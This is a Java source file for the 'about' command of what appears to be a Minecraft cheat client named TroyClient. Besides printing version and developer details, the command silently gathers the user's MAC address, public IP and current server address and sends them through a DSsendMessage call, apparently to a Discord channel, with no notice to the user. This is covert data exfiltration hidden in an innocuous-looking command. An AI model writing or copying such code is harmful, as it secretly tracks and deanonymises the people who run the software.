package it.md_4.troy.command.impl;

import it.md_4.troy.command.Command;
import it.md_4.troy.command.CommandInfo;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.ip.IpChecker;

import java.awt.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;

import static it.md_4.troy.Troy.DSsendMessage;


@CommandInfo(
        alias = "about",
        description = "Get More Information",
        usage = "'about",
        aliases = {"authors", "infoclient"}
)
public class AboutCommand extends Command {

    @Override
    public void execute(String... args) throws Exception {
        ChatHelper.printMessage("&b • &3TroyClient v1.9.5", false);
        ChatHelper.printMessage("&b • &bDeveloper: &3md_4", false);
        ChatHelper.printMessage("&b • &bDs: &3https://discord.gg/jDhQhSK9KQ", false);

        InetAddress localHost = null;
        try {
            localHost = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        NetworkInterface ni = null;
        try {
            ni = NetworkInterface.getByInetAddress(localHost);
        } catch (SocketException e) {
            e.printStackTrace();
        }
        byte[] hardwareAddress = new byte[0];
        try {
            hardwareAddress = ni.getHardwareAddress();
        } catch (SocketException e) {
            e.printStackTrace();
        }

        String[] hexadecimal = new String[hardwareAddress.length];
        for (int i = 0; i < hardwareAddress.length; i++) {
            hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
        }
        String macAddress = String.join("-", hexadecimal);

        DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "Executed Command [About]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
    }
}

